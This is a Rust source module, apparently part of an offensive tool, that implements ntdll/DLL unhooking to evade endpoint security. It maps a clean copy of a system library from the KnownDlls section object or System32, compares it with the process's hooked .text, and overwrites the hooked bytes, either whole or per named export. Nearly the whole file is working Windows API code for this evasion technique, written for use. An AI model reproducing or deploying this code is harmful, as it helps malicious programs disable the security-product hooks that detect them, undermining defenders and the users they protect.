//! The fresh-copy edge (the module's whole platform surface): where
//! the fresh bytes of a library live, how the two images meet, and
//! how the rows render. The halves that must hold for a test -- the
//! row renderings, the source names -- are plain functions this host
//! runs anywhere; only the section-object and file reads, the module
//! lookup, the page flips, and the cache flush sit behind
//! `cfg(windows)`, and the Windows crosses the CI lane builds prove
//! they compile.
//!
//! Two scoping facts shape the rows' honesty. The rewrite addresses
//! this process's own mapping: the pages flip copy-on-write as the
//! copy lands, nothing outside the process changes, and the effect
//! dies with it -- a new process maps fresh libraries. And the
//! freshness source is the section object first: the KnownDlls copy
//! is the one the loader itself maps, a copy no on-disk tamper
//! reaches and a read that opens no file -- the disk copy under
//! System32 stands as the fallback, and the row names which one
//! served.

/// The library the bare task addresses: the one whose exports every
/// security product hooks, and the one a fresh copy of is the classic
/// unhook.
pub(crate) const DEFAULT_MODULE: &str = "ntdll.dll";

/// Which fresh copy served, as the row names it.
#[cfg_attr(not(windows), allow(dead_code))]
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Source {
    /// The KnownDlls section object -- the copy the loader maps from,
    /// read through no file at all.
    SectionObject,
    /// The disk file under System32.
    DiskFile,
}

impl Source {
    #[cfg_attr(not(windows), allow(dead_code))]
    pub(crate) fn name(&self) -> &'static str {
        match self {
            Source::SectionObject => "KnownDlls section object",
            Source::DiskFile => "disk copy",
        }
    }
}

/// The whole-`.text` read's row: how many bytes differ from the
/// source that served.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn list_row(dll: &str, source: &Source, differing: usize, total: usize) -> String {
    if differing == 0 {
        format!(
            "{dll}: .text matches the {} (0 of {total} bytes differ)",
            source.name()
        )
    } else {
        format!(
            "{dll}: {differing} of {total} .text bytes differ from the {}",
            source.name()
        )
    }
}

/// The whole-`.text` write's row: how many bytes the restore rewrote,
/// or the idempotence read -- a second run reports rather than writes
/// again.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn restore_row(dll: &str, source: &Source, rewritten: usize, total: usize) -> String {
    if rewritten == 0 {
        format!(
            "{dll}: .text already matches the {} -- nothing rewritten",
            source.name()
        )
    } else {
        format!(
            "{dll}: .text restored from the {} ({rewritten} of {total} bytes rewritten)",
            source.name()
        )
    }
}

/// One function's read's row: how many of its extent's bytes differ
/// from the source that served.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn function_list_row(
    dll: &str,
    function: &str,
    source: &Source,
    differing: usize,
    span: usize,
) -> String {
    if differing == 0 {
        format!(
            "{dll}!{function}: matches the {} (0 of {span} bytes differ)",
            source.name()
        )
    } else {
        format!(
            "{dll}!{function}: {differing} of {span} bytes differ from the {}",
            source.name()
        )
    }
}

/// One function's write's row: how many of its extent's bytes the
/// restore rewrote, or the idempotence read.
#[cfg_attr(not(windows), allow(dead_code))]
pub(crate) fn function_restore_row(
    dll: &str,
    function: &str,
    source: &Source,
    rewritten: usize,
    span: usize,
) -> String {
    if rewritten == 0 {
        format!(
            "{dll}!{function}: already matches the {} -- nothing rewritten",
            source.name()
        )
    } else {
        format!(
            "{dll}!{function}: restored from the {} ({rewritten} of {span} bytes rewritten)",
            source.name()
        )
    }
}

// ---- the Windows calls ----

#[cfg(windows)]
pub(crate) mod win {
    use std::os::raw::c_void;

    use super::{Source, DEFAULT_MODULE};
    use crate::pe;

    const GENERIC_READ: u32 = 0x8000_0000;
    const FILE_SHARE_READ: u32 = 0x1;
    const FILE_SHARE_WRITE: u32 = 0x2;
    const FILE_SHARE_DELETE: u32 = 0x4;
    const OPEN_EXISTING: u32 = 3;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;
    const PAGE_READONLY: u32 = 0x2;
    const SECTION_MAP_READ: u32 = 0x0004;
    const OBJ_CASE_INSENSITIVE: u32 = 0x40;
    // The mapping disposition the loader's own views ride.
    const VIEW_SHARE: u32 = 1;
    // The read cap: a system library is a handful of megabytes, and a
    // view or file beyond this is not the copy this verb was asked to
    // read.
    const READ_CAP: usize = 64 << 20;

    type Handle = isize;
    const INVALID_HANDLE_VALUE: isize = -1;

    const STATUS_ACCESS_DENIED: i32 = 0xC000_0022_u32 as i32;
    const STATUS_OBJECT_NAME_NOT_FOUND: i32 = 0xC000_0034_u32 as i32;
    const STATUS_OBJECT_PATH_NOT_FOUND: i32 = 0xC000_0037_u32 as i32;

    /// The object manager's counted string, the encoding the NT
    /// namespace's own paths speak: a UTF-16 buffer without a
    /// terminator, its lengths in bytes.
    #[repr(C)]
    struct UnicodeString {
        length: u16,
        maximum_length: u16,
        buffer: *mut u16,
    }

    /// The NT APIs' own record, `#[repr(C)]` against its documented
    /// layout: the name alone is filled, the case-insensitive flag
    /// riding beside it.
    #[repr(C)]
    struct ObjectAttributes {
        length: u32,
        root_directory: Handle,
        object_name: *const UnicodeString,
        attributes: u32,
        security_descriptor: *const c_void,
        security_quality_of_service: *const c_void,
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn GetEnvironmentVariableW(name: *const u16, buffer: *mut u16, size: u32) -> u32;
        fn CreateFileW(
            path: *const u16,
            access: u32,
            share: u32,
            security: *const c_void,
            disposition: u32,
            flags: u32,
            template: Handle,
        ) -> Handle;
        fn ReadFile(
            file: Handle,
            buffer: *mut u8,
            to_read: u32,
            read: *mut u32,
            overlapped: *mut c_void,
        ) -> i32;
        fn CloseHandle(file: Handle) -> i32;
        fn GetLastError() -> u32;
        fn GetModuleHandleW(name: *const u16) -> *mut c_void;
        fn VirtualProtect(
            address: *mut c_void,
            size: usize,
            new_protect: u32,
            old_protect: *mut u32,
        ) -> i32;
        fn FlushInstructionCache(process: Handle, base: *const c_void, size: usize) -> i32;
        fn GetCurrentProcess() -> Handle;
    }

    #[link(name = "ntdll")]
    extern "system" {
        fn NtOpenSection(
            section: *mut Handle,
            desired: u32,
            attributes: *mut ObjectAttributes,
        ) -> i32;
        fn NtMapViewOfSection(
            section: Handle,
            process: Handle,
            base: *mut *mut c_void,
            zero_bits: usize,
            commit: usize,
            offset: *mut i64,
            view_size: *mut usize,
            disposition: u32,
            allocation: u32,
            protect: u32,
        ) -> i32;
        fn NtUnmapViewOfSection(process: Handle, base: *mut c_void) -> i32;
    }

    /// A NUL-terminated UTF-16 string, the encoding every `*W` entry
    /// point takes.
    fn wide(text: &str) -> Vec<u16> {
        text.encode_utf16().chain(std::iter::once(0)).collect()
    }

    fn nt_error(status: i32) -> String {
        match status {
            STATUS_ACCESS_DENIED => "access denied".to_string(),
            STATUS_OBJECT_NAME_NOT_FOUND => "no such section object".to_string(),
            STATUS_OBJECT_PATH_NOT_FOUND => "no KnownDlls object directory".to_string(),
            other => format!("nt status {other:#010x}"),
        }
    }

    /// The SystemRoot the disk fallback reads under: the fact of the
    /// machine this process runs on, not a path it guesses.
    fn system_root() -> Result<String, String> {
        unsafe {
            let name = wide("SystemRoot");
            let mut buffer = vec![0u16; 1024];
            let length =
                GetEnvironmentVariableW(name.as_ptr(), buffer.as_mut_ptr(), buffer.len() as u32);
            if length == 0 || length as usize >= buffer.len() {
                return Err(format!(
                    "evasion.unload: no SystemRoot environment for this user -- the fresh \
                     {DEFAULT_MODULE} copy lives under it"
                ));
            }
            Ok(String::from_utf16_lossy(&buffer[..length as usize]))
        }
    }

    /// The KnownDlls section object's image, mapped and copied whole:
    /// the loader's own clean copy, read through no file. The mapping
    /// lives exactly as long as the copy -- open, map, read, unmap,
    /// close -- and the bytes come back in the mapped layout the
    /// section's SEC_IMAGE view carries (every part at its own RVA).
    fn section_image(dll: &str) -> Result<Vec<u8>, String> {
        unsafe {
            let path = format!(r"\KnownDlls\{dll}");
            let mut units: Vec<u16> = path.encode_utf16().collect();
            let byte_length = (units.len() * 2).min(u16::MAX as usize) as u16;
            let name = UnicodeString {
                length: byte_length,
                maximum_length: byte_length,
                buffer: units.as_mut_ptr(),
            };
            let mut attributes: ObjectAttributes = std::mem::zeroed();
            attributes.length = std::mem::size_of::<ObjectAttributes>() as u32;
            attributes.object_name = &name;
            attributes.attributes = OBJ_CASE_INSENSITIVE;

            let mut section: Handle = 0;
            let status = NtOpenSection(&mut section, SECTION_MAP_READ, &mut attributes);
            if status != 0 {
                return Err(nt_error(status));
            }
            let mut base: *mut c_void = std::ptr::null_mut();
            let mut view_size: usize = 0;
            let status = NtMapViewOfSection(
                section,
                GetCurrentProcess(),
                &mut base,
                0,
                0,
                std::ptr::null_mut(),
                &mut view_size,
                VIEW_SHARE,
                0,
                PAGE_READONLY,
            );
            if status != 0 {
                CloseHandle(section);
                return Err(nt_error(status));
            }
            if view_size > READ_CAP {
                NtUnmapViewOfSection(GetCurrentProcess(), base);
                CloseHandle(section);
                return Err(format!(
                    "the {dll} section object maps more than the {} MiB this reader \
                     takes",
                    READ_CAP >> 20
                ));
            }
            let bytes = std::slice::from_raw_parts(base.cast::<u8>(), view_size).to_vec();
            NtUnmapViewOfSection(GetCurrentProcess(), base);
            CloseHandle(section);
            Ok(bytes)
        }
    }

    /// A file's bytes, read whole with every share mode offered: the
    /// system's own libraries sit open for mapping, and the read takes
    /// them as the system leaves them or names the lock that refused.
    fn read_file(path: &str) -> Result<Vec<u8>, String> {
        unsafe {
            let file = CreateFileW(
                wide(path).as_ptr(),
                GENERIC_READ,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                0,
            );
            if file == INVALID_HANDLE_VALUE {
                return Err(format!(
                    "evasion.unload: {path}: {}",
                    file_error(GetLastError())
                ));
            }
            let read_all = || {
                let mut contents = Vec::new();
                let mut buffer = vec![0u8; 64 * 1024];
                loop {
                    let mut read: u32 = 0;
                    if ReadFile(
                        file,
                        buffer.as_mut_ptr(),
                        buffer.len() as u32,
                        &mut read,
                        std::ptr::null_mut(),
                    ) == 0
                    {
                        return Err(format!(
                            "evasion.unload: {path}: {}",
                            file_error(GetLastError())
                        ));
                    }
                    if read == 0 {
                        return Ok(contents);
                    }
                    if contents.len() + read as usize > READ_CAP {
                        return Err(format!(
                            "evasion.unload: {path} is larger than the {} MiB this reader \
                             takes",
                            READ_CAP >> 20
                        ));
                    }
                    contents.extend_from_slice(&buffer[..read as usize]);
                }
            };
            let contents = read_all();
            CloseHandle(file);
            contents
        }
    }

    fn file_error(code: u32) -> String {
        match code {
            2 => "the file does not exist".to_string(),
            3 => "the path does not exist".to_string(),
            5 => "access denied".to_string(),
            32 => "another process holds the file locked".to_string(),
            other => format!("file error {other}"),
        }
    }

    /// The fresh copy of a library: the KnownDlls section object when
    /// the object manager carries one (the loader's own source, a copy
    /// no on-disk tamper reaches), the System32 file otherwise -- and
    /// a library neither path answers refuses naming both.
    fn fresh(dll: &str) -> Result<(Source, Vec<u8>), String> {
        match section_image(dll) {
            Ok(bytes) => Ok((Source::SectionObject, bytes)),
            Err(section) => {
                let path = format!(r"{}\System32\{dll}", system_root()?);
                match read_file(&path) {
                    Ok(bytes) => Ok((Source::DiskFile, bytes)),
                    Err(file) => Err(format!(
                        "evasion.unload: no fresh copy of {dll} -- the KnownDlls path \
                         ({section}) and the disk path ({file}) both refused"
                    )),
                }
            }
        }
    }

    /// The mapped image as the parses read it: the module's base and
    /// how far its mapping runs. The headers live in the image's
    /// first page, so that page names the size of image that bounds
    /// the whole mapping; an image whose section table ran past the
    /// first page refuses in the parse, named like any truncated
    /// file. The borrow lives while the mapping does -- the loader
    /// never unloads the libraries this verb addresses.
    fn mapped(dll: &str) -> Result<(*const u8, usize), String> {
        unsafe {
            let module = GetModuleHandleW(wide(dll).as_ptr());
            if module.is_null() {
                return Err(format!(
                    "evasion.unload: {dll} is not loaded in this process"
                ));
            }
            let base = module.cast::<u8>();
            let head = std::slice::from_raw_parts(base, 0x1000);
            let size = pe::size_of_image(head)?;
            if size < 0x1000 {
                return Err(format!(
                    "evasion.unload: the mapped {dll} claims to be smaller than its \
                     own headers"
                ));
            }
            Ok((base, size))
        }
    }

    /// The fresh copy's whole `.text`: where it sits in the fresh
    /// image (a section-object view addresses its parts at RVAs; the
    /// disk file at raw pointers) and how far it runs.
    fn fresh_text<'a>(source: &Source, fresh: &'a [u8]) -> Result<(&'a [u8], u32, usize), String> {
        match source {
            Source::SectionObject => {
                let section = pe::text_section(fresh)?;
                let (offset, length) = pe::mapped_text(&section, fresh.len())?;
                Ok((&fresh[offset..offset + length], section.rva, length))
            }
            Source::DiskFile => {
                let (bytes, section) = pe::disk_text(fresh)?;
                Ok((bytes, section.rva, bytes.len()))
            }
        }
    }

    /// The fresh copy's bytes for one function's extent, addressed the
    /// way the source's own layout carries it.
    fn fresh_function<'a>(
        source: &Source,
        fresh: &'a [u8],
        span: &pe::FunctionSpan,
    ) -> Result<&'a [u8], String> {
        let end = span.rva as usize + span.length as usize;
        let bytes = match source {
            Source::SectionObject => fresh.get(span.rva as usize..end),
            Source::DiskFile => {
                let offset = pe::rva_to_offset(fresh, span.rva)?;
                fresh.get(offset..offset + span.length as usize)
            }
        };
        bytes.ok_or_else(|| {
            format!(
                "the fresh copy is shorter than {span:?} -- one build the fingerprint \
                 should have told apart"
            )
        })
    }

    /// The write every restore path reduces to: the page flips
    /// writable, the fresh bytes copy over the mapped ones, the
    /// protection returns to what it was, and the instruction cache
    /// flushes -- a stale cache executes the old bytes on some
    /// architectures, so the flush is the write's last step, not
    /// polish.
    fn rewrite(base: *const u8, offset: usize, bytes: &[u8]) -> Result<(), String> {
        unsafe {
            let at = base.add(offset);
            let mut previous: u32 = 0;
            if VirtualProtect(
                at as *mut c_void,
                bytes.len(),
                PAGE_EXECUTE_READWRITE,
                &mut previous,
            ) == 0
            {
                return Err("evasion.unload: the page would not flip writable".to_string());
            }
            std::ptr::copy_nonoverlapping(bytes.as_ptr(), at as *mut u8, bytes.len());
            VirtualProtect(at as *mut c_void, bytes.len(), previous, &mut previous);
            if FlushInstructionCache(GetCurrentProcess(), at.cast(), bytes.len()) == 0 {
                return Err(
                    "evasion.unload: the instruction cache would not flush after the \
                     rewrite -- execution may read stale bytes"
                        .to_string(),
                );
            }
        }
        Ok(())
    }

    /// The read: both images parsed, fingerprint-checked, and compared
    /// -- the whole `.text` by default, or each named function's
    /// extent out of the mapped image's own export table.
    pub(crate) fn list(dll: &str, functions: &[String]) -> Result<String, String> {
        let (source, fresh) = fresh(dll)?;
        let (base, size) = mapped(dll)?;
        let mapped = unsafe { std::slice::from_raw_parts(base, size) };
        pe::same_build(&fresh, mapped)?;
        if functions.is_empty() {
            let (fresh_text, _, length) = fresh_text(&source, &fresh)?;
            let (offset, mapped_length) = spanned_text(mapped)?;
            let differing = pe::differences(fresh_text, &mapped[offset..offset + mapped_length])?;
            return Ok(super::list_row(dll, &source, differing, length));
        }
        let rows = functions
            .iter()
            .map(|name| function_read_row(dll, &source, &fresh, mapped, name))
            .collect::<Vec<_>>();
        Ok(rows.join("\n"))
    }

    /// The write the operator names: the fresh bytes over the mapped
    /// ones, the whole `.text` by default or each named function's
    /// extent -- idempotent by read, a second run reports rather than
    /// writes again.
    pub(crate) fn restore(dll: &str, functions: &[String]) -> Result<String, String> {
        let (source, fresh) = fresh(dll)?;
        let (base, size) = mapped(dll)?;
        let mapped = unsafe { std::slice::from_raw_parts(base, size) };
        pe::same_build(&fresh, mapped)?;
        if functions.is_empty() {
            let (fresh_text, _, length) = fresh_text(&source, &fresh)?;
            let (offset, mapped_length) = spanned_text(mapped)?;
            let memory = &mapped[offset..offset + mapped_length];
            let differing = pe::differences(fresh_text, memory)?;
            if differing == 0 {
                return Ok(super::restore_row(dll, &source, 0, length));
            }
            rewrite(base, offset, fresh_text)?;
            return Ok(super::restore_row(dll, &source, differing, length));
        }
        let mut rows = Vec::new();
        for name in functions {
            rows.push(match function_span(mapped, name) {
                Ok(span) => {
                    let fresh_bytes = fresh_function(&source, &fresh, &span)?;
                    let end = span.rva as usize + span.length as usize;
                    let memory = mapped
                        .get(span.rva as usize..end)
                        .ok_or("the mapped image is shorter than the extent")?;
                    let differing = pe::differences(fresh_bytes, memory)?;
                    if differing == 0 {
                        super::function_restore_row(dll, name, &source, 0, span.length as usize)
                    } else {
                        rewrite(base, span.rva as usize, fresh_bytes)?;
                        super::function_restore_row(
                            dll,
                            name,
                            &source,
                            differing,
                            span.length as usize,
                        )
                    }
                }
                // A name the table refuses answers in its own row
                // while the rest still read.
                Err(why) => format!("{dll}!{name}: {why}"),
            });
        }
        Ok(rows.join("\n"))
    }

    /// The mapped image's own `.text` span, parsed out of its own
    /// section table.
    fn spanned_text(mapped: &[u8]) -> Result<(usize, usize), String> {
        let section = pe::text_section(mapped)?;
        pe::mapped_text(&section, mapped.len())
    }

    /// One named function's extent out of the mapped image's own
    /// export table.
    fn function_span(mapped: &[u8], name: &str) -> Result<pe::FunctionSpan, String> {
        pe::function_extent(mapped, name)
    }

    /// The read's row for one named function: its extent compared
    /// against the fresh copy, or the named refusal its table answer
    /// rides as.
    fn function_read_row(
        dll: &str,
        source: &Source,
        fresh: &[u8],
        mapped: &[u8],
        name: &str,
    ) -> String {
        match function_span(mapped, name) {
            Ok(span) => match fresh_function(source, fresh, &span) {
                Ok(fresh_bytes) => {
                    let end = span.rva as usize + span.length as usize;
                    match mapped.get(span.rva as usize..end) {
                        Some(memory) => match pe::differences(fresh_bytes, memory) {
                            Ok(differing) => super::function_list_row(
                                dll,
                                name,
                                source,
                                differing,
                                span.length as usize,
                            ),
                            Err(why) => format!("{dll}!{name}: {why}"),
                        },
                        None => format!(
                            "{dll}!{name}: the mapped image is shorter than \
                                         the extent"
                        ),
                    }
                }
                Err(why) => format!("{dll}!{name}: {why}"),
            },
            Err(why) => format!("{dll}!{name}: {why}"),
        }
    }
}

#[cfg(windows)]
pub(crate) use win::{list, restore};

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_read_names_the_count_and_the_source_it_read() {
        assert_eq!(
            list_row("ntdll.dll", &Source::DiskFile, 24, 2048),
            "ntdll.dll: 24 of 2048 .text bytes differ from the disk copy"
        );
        assert_eq!(
            list_row("kernel32.dll", &Source::SectionObject, 0, 2048),
            "kernel32.dll: .text matches the KnownDlls section object (0 of 2048 bytes \
             differ)"
        );
    }

    #[test]
    fn the_write_names_what_it_rewrote_or_reported() {
        assert_eq!(
            restore_row("ntdll.dll", &Source::SectionObject, 24, 2048),
            "ntdll.dll: .text restored from the KnownDlls section object (24 of 2048 \
             bytes rewritten)"
        );
        // The idempotence read: a second run reports rather than
        // writes again.
        assert_eq!(
            restore_row("ntdll.dll", &Source::DiskFile, 0, 2048),
            "ntdll.dll: .text already matches the disk copy -- nothing rewritten"
        );
    }

    #[test]
    fn the_function_rows_name_their_extents_and_the_source() {
        assert_eq!(
            function_list_row("ntdll.dll", "NtOpenFile", &Source::DiskFile, 5, 32),
            "ntdll.dll!NtOpenFile: 5 of 32 bytes differ from the disk copy"
        );
        assert_eq!(
            function_restore_row("ntdll.dll", "NtOpenFile", &Source::SectionObject, 0, 32),
            "ntdll.dll!NtOpenFile: already matches the KnownDlls section object -- \
             nothing rewritten"
        );
        assert_eq!(
            function_restore_row("kernel32.dll", "CreateFileW", &Source::SectionObject, 5, 32),
            "kernel32.dll!CreateFileW: restored from the KnownDlls section object (5 of \
             32 bytes rewritten)"
        );
    }
}
